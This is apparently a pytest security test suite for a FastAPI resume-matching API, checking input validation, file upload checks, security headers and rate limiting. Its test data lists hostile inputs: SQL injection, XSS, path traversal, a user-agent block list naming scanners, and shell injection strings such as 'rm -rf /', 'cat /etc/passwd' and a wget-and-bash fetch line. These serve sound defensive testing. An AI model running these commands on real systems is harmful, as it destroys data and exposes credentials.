"""
Comprehensive security tests for CV-Match API.

This module contains security tests to verify that input validation,
injection attack prevention, and other security measures are working
correctly.
"""

import pytest
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch
import json
import logging

from app.main import app
from app.models.secure import SecureLoginRequest, SecureFileUploadRequest
from app.utils.validation import validate_string, validate_dict
from app.utils.file_security import validate_file_security, FileSecurityConfig

logger = logging.getLogger(__name__)

# Create test client
client = TestClient(app)


class TestInputValidation:
    """Test input validation utilities."""

    def test_validate_string_sql_injection(self):
        """Test SQL injection prevention in string validation."""
        # SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
        ]

        for malicious_input in malicious_inputs:
            result = validate_string(malicious_input, input_type="general")
            assert not result.is_valid, f"SQL injection not detected: {malicious_input}"
            assert "sql" in " ".join(result.blocked_patterns).lower()

    def test_validate_string_xss_prevention(self):
        """Test XSS prevention in string validation."""
        # XSS attempts
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "onload=alert('xss')",
        ]

        for xss_input in xss_inputs:
            result = validate_string(xss_input, input_type="general")
            assert not result.is_valid, f"XSS not detected: {xss_input}"
            assert any(pattern in " ".join(result.blocked_patterns).lower()
                      for pattern in ["xss", "script", "javascript"])

    def test_validate_string_command_injection(self):
        """Test command injection prevention in string validation."""
        # Command injection attempts
        command_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(curl malicious.com)",
            "`wget hack.sh && bash hack.sh`",
            "&& python -c 'import os; os.system(\"rm -rf /\")'",
        ]

        for command_input in command_inputs:
            result = validate_string(command_input, input_type="general")
            assert not result.is_valid, f"Command injection not detected: {command_input}"
            assert any(pattern in " ".join(result.blocked_patterns).lower()
                      for pattern in ["command", "injection"])

    def test_validate_string_path_traversal(self):
        """Test path traversal prevention in string validation."""
        # Path traversal attempts
        path_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ]

        for path_input in path_inputs:
            result = validate_string(path_input, input_type="general")
            assert not result.is_valid, f"Path traversal not detected: {path_input}"
            assert "path" in " ".join(result.blocked_patterns).lower()

    def test_validate_string_safe_inputs(self):
        """Test that safe inputs pass validation."""
        safe_inputs = [
            "John Doe",
            "john.doe@example.com",
            "Hello, this is a safe message!",
            "Regular text with punctuation: .,!?;:",
            "123-456-7890",
            "https://example.com/path?param=value",
        ]

        for safe_input in safe_inputs:
            result = validate_string(safe_input, input_type="general")
            assert result.is_valid, f"Safe input was rejected: {safe_input}"
            assert len(result.blocked_patterns) == 0

    def test_validate_dict_injection_prevention(self):
        """Test dictionary validation prevents injection."""
        malicious_dict = {
            "safe_key": "safe_value",
            "sql_injection": "'; DROP TABLE users; --",
            "xss": "<script>alert('xss')</script>",
            "nested": {
                "command": "$(rm -rf /)",
                "path": "../../../etc/passwd"
            }
        }

        result = validate_dict(malicious_dict, max_items=10, max_value_length=1000)
        assert not result.is_valid
        assert len(result.errors) > 0

    def test_validate_dict_safe_inputs(self):
        """Test that safe dictionaries pass validation."""
        safe_dict = {
            "name": "John Doe",
            "email": "john.doe@example.com",
            "preferences": {
                "theme": "dark",
                "notifications": True
            },
            "metadata": {
                "source": "web",
                "version": "1.0.0"
            }
        }

        result = validate_dict(safe_dict, max_items=20, max_value_length=500)
        assert result.is_valid
        assert len(result.errors) == 0


class TestFileSecurity:
    """Test file security validation."""

    def test_validate_pdf_file_security(self):
        """Test PDF file security validation."""
        # Mock PDF content (simplified)
        pdf_content = b"%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF"

        result = validate_file_security(
            file_content=pdf_content,
            filename="document.pdf",
            content_type="application/pdf"
        )

        assert result.is_safe
        assert len(result.errors) == 0
        assert result.file_info["size"] == len(pdf_content)
        assert result.checksum is not None

    def test_validate_docx_file_security(self):
        """Test DOCX file security validation."""
        # Mock DOCX content (ZIP header)
        docx_content = b"PK\x03\x04\x14\x00\x06\x00"  # ZIP file header

        result = validate_file_security(
            file_content=docx_content,
            filename="document.docx",
            content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        )

        # Note: This is a simplified test - real DOCX validation would be more complex
        assert result.file_info["size"] == len(docx_content)

    def test_validate_file_size_limits(self):
        """Test file size limit enforcement."""
        # Create content larger than limit
        large_content = b"A" * (11 * 1024 * 1024)  # 11MB

        result = validate_file_security(
            file_content=large_content,
            filename="large_file.pdf",
            content_type="application/pdf"
        )

        assert not result.is_safe
        assert any("too large" in error.lower() for error in result.errors)

    def test_validate_malicious_file_content(self):
        """Test malicious file content detection."""
        # Mock executable content
        executable_content = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"

        result = validate_file_security(
            file_content=executable_content,
            filename="malicious.pdf",
            content_type="application/pdf"
        )

        assert not result.is_safe
        assert len(result.blocked_patterns) > 0

    def test_validate_filename_security(self):
        """Test filename security validation."""
        malicious_filenames = [
            "../../../etc/passwd",
            "document.pdf\x00.exe",
            "con.pdf",  # Reserved name
            "file<with>brackets.pdf",
            "file|with|pipes.pdf",
        ]

        for filename in malicious_filenames:
            result = validate_file_security(
                file_content=b"safe content",
                filename=filename,
                content_type="application/pdf"
            )

            if "path traversal" in filename.lower() or "\x00" in filename or "con." in filename.lower():
                assert not result.is_safe, f"Malicious filename not detected: {filename}"


class TestAPISecurity:
    """Test API endpoint security."""

    def test_login_endpoint_sql_injection(self):
        """Test login endpoint SQL injection protection."""
        malicious_payloads = [
            {"email": "admin'--", "password": "password"},
            {"email": "' OR '1'='1", "password": "password"},
            {"email": "admin'; DROP TABLE users; --", "password": "password"},
        ]

        for payload in malicious_payloads:
            response = client.post("/api/auth/login", json=payload)
            # Should return 400 for malformed input or 401 for failed auth, never 500
            assert response.status_code in [400, 401]
            assert "server error" not in response.text.lower()

    def test_login_endpoint_xss_protection(self):
        """Test login endpoint XSS protection."""
        xss_payloads = [
            {"email": "<script>alert('xss')</script>@example.com", "password": "password"},
            {"email": "test@example.com", "password": "<script>alert('xss')"},
        ]

        for payload in xss_payloads:
            response = client.post("/api/auth/login", json=payload)
            # Should return 400 for malformed input
            assert response.status_code == 400

    def test_upload_endpoint_file_validation(self):
        """Test file upload endpoint security validation."""
        # Test malicious filename
        files = {
            "file": ("../../../etc/passwd", b"fake content", "application/pdf")
        }

        # Note: This test would require authentication in a real scenario
        # For now, test the endpoint structure
        response = client.post("/api/resumes/upload", files=files)
        # Should return 401 for unauthorized, but not 500 for security errors
        assert response.status_code in [401, 400, 422]

    def test_payments_endpoint_validation(self):
        """Test payments endpoint input validation."""
        malicious_payloads = [
            {
                "tier": "basic'; DROP TABLE payments; --",
                "success_url": "javascript:alert('xss')",
                "metadata": {"sql": "'; DROP TABLE users; --"}
            },
            {
                "tier": "<script>alert('xss')</script>",
                "amount": -1000,  # Negative amount
                "metadata": {"xss": "<script>alert('xss')"}
            }
        ]

        for payload in malicious_payloads:
            response = client.post("/api/payments/create-checkout", json=payload)
            # Should return 401 for unauthorized or 400 for bad input
            assert response.status_code in [401, 400, 422]

    def test_api_rate_limiting(self):
        """Test API rate limiting."""
        # Make multiple rapid requests
        for i in range(10):
            response = client.get("/")
            # First requests should succeed
            if i < 5:
                assert response.status_code == 200
            else:
                # Later requests might be rate limited
                # Note: Rate limiting behavior depends on configuration
                assert response.status_code in [200, 429]

    def test_security_headers(self):
        """Test that security headers are present."""
        response = client.get("/")

        # Check for security headers
        security_headers = [
            "x-frame-options",
            "x-content-type-options",
            "x-xss-protection",
            "content-security-policy",
            "referrer-policy",
            "strict-transport-security",
        ]

        for header in security_headers:
            assert header in response.headers, f"Missing security header: {header}"


class TestSecureModels:
    """Test secure Pydantic models."""

    def test_secure_login_model_validation(self):
        """Test SecureLoginRequest model validation."""
        # Valid input
        valid_data = {
            "email": "john.doe@example.com",
            "password": "SecurePass123!"
        }
        login_request = SecureLoginRequest(**valid_data)
        assert login_request.email == valid_data["email"]
        assert login_request.password == valid_data["password"]

        # Invalid email with injection
        invalid_data = {
            "email": "admin'; DROP TABLE users; --",
            "password": "password"
        }
        with pytest.raises(ValueError):
            SecureLoginRequest(**invalid_data)

        # Invalid password with script
        invalid_data = {
            "email": "test@example.com",
            "password": "<script>alert('xss')</script>"
        }
        with pytest.raises(ValueError):
            SecureLoginRequest(**invalid_data)

    def test_secure_file_upload_model_validation(self):
        """Test SecureFileUploadRequest model validation."""
        # Valid input
        valid_data = {
            "filename": "document.pdf",
            "file_size": 1024,
            "content_type": "application/pdf"
        }
        file_request = SecureFileUploadRequest(**valid_data)
        assert file_request.filename == valid_data["filename"]

        # Invalid filename with path traversal
        invalid_data = {
            "filename": "../../../etc/passwd",
            "file_size": 1024,
            "content_type": "application/pdf"
        }
        with pytest.raises(ValueError):
            SecureFileUploadRequest(**invalid_data)

        # File size too large
        invalid_data = {
            "filename": "document.pdf",
            "file_size": 20 * 1024 * 1024,  # 20MB
            "content_type": "application/pdf"
        }
        with pytest.raises(ValueError):
            SecureFileUploadRequest(**invalid_data)


class TestSecurityMiddleware:
    """Test security middleware functionality."""

    def test_request_size_limiting(self):
        """Test request size limiting."""
        # Create a very large payload
        large_payload = {"data": "A" * (12 * 1024 * 1024)}  # 12MB

        response = client.post(
            "/api/test/echo",
            json=large_payload,
            headers={"Content-Type": "application/json"}
        )

        # Should return 413 Payload Too Large
        assert response.status_code == 413

    def test_blocked_user_agents(self):
        """Test blocked user agent filtering."""
        malicious_user_agents = [
            "sqlmap/1.0",
            "nikto/2.1",
            "nmap-scanner",
        ]

        for user_agent in malicious_user_agents:
            response = client.get(
                "/",
                headers={"User-Agent": user_agent}
            )
            # Should return 403 Forbidden
            assert response.status_code == 403

    def test_malicious_request_patterns(self):
        """Test detection of malicious request patterns."""
        malicious_patterns = [
            "/api/users?id=1' OR '1'='1",
            "/api/search?q=<script>alert('xss')</script>",
            "/api/file?path=../../../etc/passwd",
        ]

        for pattern in malicious_patterns:
            response = client.get(pattern)
            # Should not return 500 (internal server error)
            assert response.status_code != 500


class TestIntegrationSecurity:
    """Integration tests for complete security workflow."""

    def test_complete_secure_workflow(self):
        """Test complete secure user workflow."""
        # 1. Secure login attempt
        login_response = client.post("/api/auth/secure-login", json={
            "email": "test@example.com",
            "password": "SecurePass123!"
        })
        # Should return 401 for invalid credentials but handle input securely
        assert login_response.status_code in [401, 400]

        # 2. Attempt to access protected endpoint
        response = client.get("/api/resumes/")
        # Should return 401 for missing authentication
        assert response.status_code == 401

        # 3. Test secure file upload (would need auth token in real scenario)
        files = {"file": ("safe_document.pdf", b"fake pdf content", "application/pdf")}
        upload_response = client.post("/api/resumes/upload", files=files)
        # Should return 401 for unauthorized
        assert upload_response.status_code in [401, 400]

    def test_error_handling_security(self):
        """Test that error handling doesn't leak sensitive information."""
        # Trigger various error conditions
        error_endpoints = [
            "/api/nonexistent",
            "/api/auth/login",  # With invalid payload
            "/api/resumes/invalid-uuid",
        ]

        for endpoint in error_endpoints:
            response = client.get(endpoint)
            # Should not leak sensitive information in error responses
            assert "password" not in response.text.lower()
            assert "secret" not in response.text.lower()
            assert "token" not in response.text.lower()
            assert "sql" not in response.text.lower()

    def test_logging_security(self):
        """Test that security events are properly logged."""
        with patch('logging.Logger.info') as mock_info, \
             patch('logging.Logger.warning') as mock_warning:

            # Trigger a login attempt
            client.post("/api/auth/login", json={
                "email": "test@example.com",
                "password": "password"
            })

            # Should have logged security events
            assert mock_info.called or mock_warning.called


if __name__ == "__main__":
    pytest.main([__file__])